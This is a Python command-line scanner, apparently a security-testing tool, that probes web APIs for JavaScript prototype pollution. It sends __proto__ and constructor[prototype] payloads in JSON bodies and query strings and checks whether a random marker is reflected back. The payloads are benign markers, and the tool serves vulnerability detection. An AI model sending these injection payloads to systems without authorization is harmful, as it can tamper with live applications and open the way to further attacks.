#!/usr/bin/env python3
"""
Proto Pollute — JavaScript Prototype Pollution Detection Tool
Tests REST APIs and web pages for prototype pollution via __proto__ / constructor injection.
Author: Omar Khalid (amooryx) | github.com/amooryx/proto-pollute
AUTHORIZED USE ONLY.
"""

import argparse
import json
import random
import string
import sys
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

def rand_marker() -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=8))

PROTO_PAYLOADS = [
    lambda m: {"__proto__": {"polluted": m}},
    lambda m: {"constructor": {"prototype": {"polluted": m}}},
    lambda m: {"__proto__[polluted]": m},
    lambda m: {"constructor[prototype][polluted]": m},
]

QUERY_PAYLOADS = [
    lambda m, k: f"__proto__[{k}]={m}",
    lambda m, k: f"constructor[prototype][{k}]={m}",
    lambda m, k: f"__proto__.{k}={m}",
]

def send_json(url: str, payload: dict, headers: dict, timeout: float) -> dict:
    data = json.dumps(payload).encode()
    req  = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent",   "ProtoPollute/1.0")
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(8192).decode(errors="ignore")
            return {"status": resp.status, "body": body}
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode(errors="ignore") if hasattr(e, "read") else ""
        return {"status": e.code, "body": body}
    except Exception as ex:
        return {"status": 0, "body": "", "error": str(ex)}

def test_json_pollution(url: str, headers: dict, timeout: float) -> list[dict]:
    findings = []
    for fn in PROTO_PAYLOADS:
        marker  = rand_marker()
        payload = fn(marker)
        resp    = send_json(url, payload, headers, timeout)
        if marker in resp.get("body", ""):
            findings.append({
                "type": "json_proto_pollution",
                "payload": json.dumps(payload)[:100],
                "marker": marker,
                "status": resp["status"],
                "note": "Injected marker reflected — prototype pollution may affect object properties",
                "vulnerable": True,
            })
            print(f"  [!!!] JSON PP reflected: {json.dumps(payload)[:60]}")
    return findings

def test_qs_pollution(url: str, headers: dict, timeout: float) -> list[dict]:
    findings = []
    for fn in QUERY_PAYLOADS:
        marker  = rand_marker()
        key     = f"test_{rand_marker()}"
        extra_qs = fn(marker, key)
        sep      = "&" if "?" in url else "?"
        test_url = url + sep + extra_qs
        req = urllib.request.Request(test_url)
        for k, v in headers.items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(8192).decode(errors="ignore")
                if marker in body:
                    findings.append({
                        "type": "qs_proto_pollution",
                        "payload": extra_qs[:80],
                        "marker": marker,
                        "status": resp.status,
                        "note": "Prototype pollution marker reflected via query string",
                        "vulnerable": True,
                    })
                    print(f"  [!!!] QS PP reflected: {extra_qs[:60]}")
        except Exception:
            pass
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="Proto Pollute — Prototype Pollution Detection (Authorized use only)",
    )
    parser.add_argument("url",        help="Target URL (JSON API endpoint)")
    parser.add_argument("--qs",       action="store_true", help="Also test query-string pollution")
    parser.add_argument("--timeout",  type=float, default=10)
    parser.add_argument("--header",   nargs="*", help="Extra headers: 'Key: Value'")
    parser.add_argument("--out",      help="Output JSON file")
    args = parser.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            if ": " in h:
                k, v = h.split(": ", 1)
                headers[k] = v

    print(f"[*] Prototype pollution testing: {args.url}")
    findings = test_json_pollution(args.url, headers, args.timeout)
    if args.qs:
        findings += test_qs_pollution(args.url, headers, args.timeout)

    print(f"\n[*] {len(findings)} prototype pollution findings")
    if args.out:
        with open(args.out, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
